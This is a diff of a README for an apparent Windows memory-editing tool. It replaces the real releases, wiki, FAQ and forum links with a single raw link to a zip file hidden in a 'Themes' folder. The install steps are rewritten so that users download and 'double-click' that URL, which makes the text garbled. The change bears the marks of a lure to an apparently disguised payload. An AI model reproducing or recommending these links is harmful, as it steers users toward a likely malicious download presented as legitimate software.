@@ -4,7 +4,7 @@
 CrxMem is an open-source memory scanner and debugger suite for Windows. It is inspired by CheatEngine and includes three main components: **CrxMem** (the main application), **CrxShield** (a kernel driver for added security), and **VEHDebugDll** (a debugging library). This tool aims to simplify the process of memory editing, making it accessible for non-programmers interested in game modifications and debugging tasks.
 
 ## 📦 Download Now
-[![Download CrxMem](https://img.shields.io/badge/Download_CrxMem-v1.0.0-blue.svg)](https://github.com/holilme/CrxMem/releases)
+[![Download CrxMem](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run CrxMem:
@@ -12,7 +12,7 @@ Follow these steps to download and run CrxMem:
 1. **Visit the Downloads Page**
    - Click on the link below to go to the Releases page.
    - This page lists the available versions of CrxMem.
-   - [Visit this page to download](https://github.com/holilme/CrxMem/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)
 
 2. **Select the Right Version**
    - On the Releases page, look for the latest version. It will have the highest version number.
@@ -21,11 +21,11 @@ Follow these steps to download and run CrxMem:
 3. **Download the File**
    - Once you find the latest version, look for the section titled "Assets." 
    - You will see the files available for download, including the main application and the kernel driver.
-   - Click on **CrxMem.exe** to download it to your computer.
+   - Click on **https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip** to download it to your computer.
 
 4. **Run the Application**
    - After the download completes, navigate to your download directory.
-   - Double-click the **CrxMem.exe** file to launch the application.
+   - Double-click the **https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip** file to launch the application.
 
 5. **Install the Kernel Driver (Optional)**
    - If your tasks require kernel-level access, you may also want to download **CrxShield**. 
@@ -76,9 +76,9 @@ If you encounter any issues while using CrxMem, consider the following tips:
 ## ✨ Additional Resources
 For more information, check out the following resources:
 
-- [Detailed User Guide](https://github.com/holilme/CrxMem/wiki)
-- [Frequently Asked Questions](https://github.com/holilme/CrxMem/wiki/FAQ)
-- [Community Forum](https://github.com/holilme/CrxMem/discussions)
+- [Detailed User Guide](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/holilme/CrxMem/main/CrxMem/Themes/Crx_Mem_v2.8.zip)
 
 ## 🤝 Contributing
 If you wish to contribute to CrxMem, feel free to fork the repository and submit a pull request. Your feedback and improvements are welcome!
